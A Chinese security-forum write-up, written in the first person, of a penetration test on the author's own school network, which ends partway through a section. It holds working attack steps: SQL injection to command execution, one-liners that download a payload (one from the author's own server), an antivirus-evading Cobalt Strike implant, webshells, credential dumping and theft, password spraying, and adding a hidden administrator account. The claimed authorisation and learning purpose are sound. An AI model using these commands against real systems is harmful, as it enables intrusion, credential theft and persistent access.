---
title: 实战 | 对自己学校内网的渗透测试
url: https://forum.butian.net/share/3671
source: 奇安信攻防社区
date: 2024-08-21
fetch_date: 2025-10-06T18:00:33.611910
---

# 实战 | 对自己学校内网的渗透测试

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 实战 | 对自己学校内网的渗透测试

* [渗透测试](https://forum.butian.net/topic/47)

一直以来都想拿自己学校的内网练练手，跟负责网安的老师说了一声后，回去直接开搞。这里作了比较详细的记录，希望大家能多多指点。

### \*\*一、图书馆管理系统\*\*
#### 1.1 SQL注入开启xp\\_cmdshell
1.1.1 首先是图书馆管理系统，这个系统是开在公网的。目录扫描发现Web Api Help接口文档泄露。我们拼接上图的第二个接口，发现在szReaderID参数处传入单数个单引号，就会报错；传入双数个单引号，就会回显操作成功。证明很可能存在注入。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-f4eaadd7ae6cf3c4dccd242fbcb4401f36a105b4.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-348f6cc2e10cd912fd0ef4568f8fdc7335dc558b.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-5508bb64e48ca0d3525845053e4b80e95ca2f9b3.png)
1.1.2 sqlmap跑一下。因为是sql server，所以可以直接--os-shell开启xp\\_cmdshell来命令执行。当前的权限还很低，为了进一步提权，得上个CS马。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-01be28db5bc975f1e7d9933eb87e7b78259bc403.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-85647a9cecda63e7a522d4272d95ec342a74c44a.png)
#### \*\*1.2 尝试远程下载上线CS\*\*
1.2.1 以下是一些常用的远程下载命令
`certutil -urlcache -split -f http://127.0.0.1:8080/nc.txt c:\\nc.txt  //certutil下载文件`
`bitsadmin /rawreturn /transfer getfile http://download.sysinternals.com/files/PSTools.zip c:\\Pstools.zip  //bitsadmin下载文件`
`powershell -nop -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://127.0.0.1/nc.txt','nc.exe') //powershell下载文件`
`cmd /c start /min msedge.exe http://127.0.0.1/test.zip && timeout 5 && taskkill /f /t /im msedge.exe && C:/Users/%UserName%/Downloads/test.zip  //msedge下载并执行`
1.2.2 tasklist /svc 看一下，发现有defender，那么我们就可以做个免杀CS马传上去。先在本地开启一个python的http服务，把马放在上面，再在sqlmap上让目标服务器执行
`powershell -nop -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://xxx.xxx.xxx.xx:8000/360safe.exe','c:\\programdata\\360safe.exe') `，
把马360safe.exe远程下载到他C盘的programdata目录下。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-fdbb08651bda881f010fe9580160c0f9c55b3d84.png)
1.2.3 成功地传上了马，但执行木马时，却发现无法执行。后面又尝试把马放到其他几个目录执行，也还是不行。可能是权限问题。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-087395c6b737afc2425a2fc78f9af0d10696786e.png)
#### \*\*1.3 找网站根目录写shell\*\*
1.3.1 那就写aspx的webshell到网站里吧。这里存放js的目录也是可以解析aspx的，我们可以执行命令全局搜索目标系统的js文件。
`Dir /s /b D:\\app.a1cccec9.js`
得知其该系统存放JS的目录是D:\\\\disttsg\\dist\\js 。这时我们就可以让目标服务器抓取webshell了。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-23ffc3071afe88fd818df021fe6ada737f8e500d.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-2a17493e6ddf5164746dc1295e241500d3641800.png)
1.3.2 先去浏览器访问一下shell，显示是存在的而且已经成功解析。可刚连接成功就变成404了。我心想之前没见过defender杀冰蝎马啊，感觉是有别的东西在作怪。
于是乎又用了哥斯拉不同加密方式的马，全都是刚连上就没了。正在我一筹莫展的时候，朋友提醒我可以尝试改一下冰蝎的默认密码。结果传上去再连真就不被杀了。
![1.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-348963b41002eec08e5283baf8355521b93c1471.png)
#### \*\*1.4 成功上线CS提权\*\*
1.4.1 在冰蝎的“命令执行”模块下，执行命令时回显拒绝访问。但在“虚拟终端”模块下可以正常执行。信息收集了一下发现没有域，属于工作组。于是再把CS马丢上去执行。这里终于成功上线了。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-992d9798a002f59272c710acbcae8a7c41f7f7a0.png)
1.4.2 是台win10，CS直接getsystem。得到system令牌后直接抓hash还是会失败。于是可以使用巨龙拉冬插件的“本地提权”下的“System2Admin”功能。利用伪造的system权限，反弹一个管理员权限的会话回来。用这个管理员权限的会话就可以抓密码的哈希值啦。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-cdf09645418e490c38cb031cf64cfa0823961768.png)
#### \*\*1.5 拿到大量数据和权限\*\*
1.5.1 去cmd5解出了密码 ,再用超级弱口令爆破工具喷洒一下B段，发现三台服务器都是这个密码。那直接去远程连接。用windows的mstsc连接的时候会报错，我不记得具体报错是什么了，总之后面是去kali连的。kali自带的远程连接工具有xfreerdp和rdesktop，我比较喜欢前者。
`xfreerdp /u:Administrator /p:Password123 /v:xxx.xxx.xxx.xxx /size:80%`
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-7eccddf993bcc6b495ba75e695eca5d770d51486.png)
1.5.2 在其中一台服务器的桌面上发现了一个神秘的文本文档，打开以后发现明显是一串密码。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-fca0038a547f09d4a987b11c69b6c9181a163719.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-6b64a6ae87ca8445346ee1ab95dabb3b07611bc9.png)
1.5.3 用上面的密码尝试登录这台服务器上面运行的WEB系统，果不其然登录成功，拿下全校教室电源和多媒体控制权。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-41e979e76a7ef61d0d42827f447cc84d2f368ea5.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-afbe4b6e8ab122ee21205daa75f19c6e4bcc0a57.png)
1.5.4 关杀软后把searchall丢到服务器上，收集一下敏感文件以及浏览器缓存的信息。这里从浏览器缓存中得到了服务器管理员的校园网账号密码。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-c711a0fb7890674a80ea5400623bbbeac9290bb3.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-43cc21c630b948be1d22f86b7f102f4e63cf823c.png)
工具链接： <https://github.com/Naturehi666/searchall>
1.5.5 第二台机器是win2008server，上面宝塔面板搭建的网站早已废弃，也没啥敏感信息。在第三台win10中同样找到了一些web的密码，成功登录我们学院的教学实训平台管理端。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-ff96ceda95ff7b2404a02f48bf246cb2a22ae6e8.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-785103b37d434468088203a5831222152f0b6861.png)
1.5.6 丢CS马到第三台服务器上，用CS插件收集navicat和xshell的缓存密码，拿下2个mysql数据库和4台linux主机。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-421b464f7d85f99add77f88c3b30b0fb3f912547.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-b5b6659e93a470ef65dd3919097fc3b61c18603e.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-247c27246447660d87673c835f560d1a82cab8fc.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-896643487e03c3f08c48aafbca57c3934cbf62eb.png)
### \*\*二、违规联网检测系统\*\*
#### \*\*2.1 接口未授权得到管理员密码\*\*
2.1.1 开局经典登录框，登陆包的密码被加密了不好爆破。这种vue.js框架的系统可以多去找一下js接口未授权，经过一番测试，发现/api/v1/system/user接口泄露了管理员密码。这里忘记截图了。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-7e1bc50cec4ea498a4ea3eef0eab241a7d71a586.png)
2.1.2 进去发现这个系统记录着全校学生的“科学上网”记录，以及访问违法网站、境外网站的详细记录（难绷）。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-e03a34ea66cbc35b99fe903ca3808ddff1516a67.png)
#### \*\*2.2 sql注入到udf提权\*\*
2.2.1 挂上burpsuite的被动插件xiasql在后台东点西点，很快发现 /api/v1/toolAct/findAgg?orderBy= 这里存在注入。而且这个接口也是未授权，不登录也能直接访问，所以可以把url直接丢sqlmap跑。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-14225b031a919ae9ece53a72fabcb8b46655a984.png)
2.2.2 拿到密码的哈希后，请了有cmd5会员的同学帮我解，然后直接navicat连接。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-6ed286577f37f839ab893e80b6e17bcbef8b6854.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-605950dfad1c7f728c90f4e51e87075fb1061b06.png)
2.2.3 如上图所示，
`show variables like 'secure\_file\_priv'`，发现输出为空，证明这个数据库有任意目录读写的权限。`show variables like '%version\_%'`，得知服务器是32位的windows。
那么就可以使用`sqlmap -d "mysql://root:密码@xxx.xxx.xxx.xxx:3306/mysql" --random-agent --os-shell` 尝试UDF提权。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-db20f991e5b8ffdf02b8a32eca9ccc94c9d80cb9.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-1aaf341b9a6352f7e1c3dfb0a7c4d743f11d67d4.png)
#### \*\*2.3 绕过火绒添加用户\*\*
2.3.1 提权成功，有了system权限，可以尝试添加用户远程连接。
`net user newuser password123 /add`
`net localgroup administrators newuser /add`
但添加用户时又回显超时...